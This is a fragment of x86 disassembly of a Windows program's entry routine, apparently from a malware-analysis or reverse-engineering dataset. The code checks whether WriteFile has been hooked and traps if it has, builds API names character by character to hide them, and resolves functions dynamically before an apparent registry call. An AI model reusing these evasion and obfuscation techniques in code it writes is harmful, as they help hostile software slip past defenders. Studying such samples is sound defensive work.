
start:
0x004016f0:	pushl	%ebp
0x004016f1:	movl	%esp, %ebp
0x004016f3:	subl	$0xd8, %esp
0x004016f9:	pushl	%ebx
0x004016fa:	pushl	%esi
0x004016fb:	pushl	%edi
0x004016fc:	movl	%ebp, 0x0041d884
0x00401702:	pusha	
0x00401703:	movl	$0x0, -140(%ebp)
0x0040170d:	movl	$0x80000002, -160(%ebp)
0x00401717:	movl	WriteFile@kernel32.dll, %eax
0x0040171c:	movl	%eax, -192(%ebp)
0x00401722:	movl	$0x405178, -176(%ebp)
0x0040172c:	movl	$0x40518c, -188(%ebp)
0x00401736:	movl	$0x405198, -180(%ebp)
0x00401740:	movl	-192(%ebp), %ecx
0x00401746:	movzbl	(%ecx), %edx
0x00401749:	cmpl	$0x55, %edx
0x0040174c:	je	0x0040176d	; targets: 0x0040176d(MAY), 0x0040174e(MAY)
0x0040174e:	movl	-192(%ebp), %eax	; from: 0x0040174c(MAY)
0x00401754:	movzbl	(%eax), %ecx
0x00401757:	cmpl	$0x8b, %ecx
0x0040175d:	je	0x0040176d	; targets: 0x0040176d(MAY), 0x0040175f(MAY)
0x0040175f:	movl	-192(%ebp), %edx	; from: 0x0040175d(MAY)
0x00401765:	movzbl	(%edx), %eax
0x00401768:	cmpl	$0x6a, %eax
0x0040176b:	jne	0x004017aa	; targets: 0x004017aa(MAY), 0x0040176d(MAY)
0x0040176d:	movl	$0x61, %ecx	; from: 0x0040176b(MAY), 0x0040174c(MAY), 0x0040175d(MAY)
0x00401772:	movl	-176(%ebp), %edx
0x00401778:	movw	%cx, (%edx)
0x0040177b:	movl	$0x61, %eax
0x00401780:	movl	-176(%ebp), %ecx
0x00401786:	movw	%ax, 0x6(%ecx)
0x0040178a:	movl	$0x70, %edx
0x0040178f:	movl	-176(%ebp), %eax
0x00401795:	movw	%dx, 0x8(%eax)
0x00401799:	movl	$0x69, %ecx
0x0040179e:	movl	-176(%ebp), %edx
0x004017a4:	movw	%cx, 0xa(%edx)
0x004017a8:	jmp	0x004017ac	; targets: 0x004017ac(MAY)
0x004017aa:	int	$0x4	; from: 0x0040176b(MAY)
0x004017ac:	movl	-188(%ebp), %eax	; from: 0x004017a8(MAY)
0x004017b2:	movb	$0x52, (%eax)
0x004017b5:	movl	-188(%ebp), %ecx
0x004017bb:	pushl	%ecx
0x004017bc:	movl	-176(%ebp), %edx
0x004017c2:	pushl	%edx
0x004017c3:	call	GetModuleHandleW@kernel32.dll	; targets: 0xff000080(MAY)
0x004017c9:	pushl	%eax
0x004017ca:	call	GetProcAddress@kernel32.dll	; targets: 0xff000050(MAY)
0x004017d0:	movl	%eax, 0x0041d88c
0x004017d5:	movl	$0x53, %eax
0x004017da:	movl	-180(%ebp), %ecx
0x004017e0:	movw	%ax, 0x4(%ecx)
0x004017e4:	movl	$0x49, %edx
0x004017e9:	movl	-180(%ebp), %eax
0x004017ef:	movw	%dx, 0x6(%eax)
0x004017f3:	leal	-184(%ebp), %ecx
0x004017f9:	pushl	%ecx
0x004017fa:	movl	-180(%ebp), %edx
0x00401800:	pushl	%edx
0x00401801:	pushl	$0x80000000
0x00401806:	call	0x0041d88c	; targets: unresolved
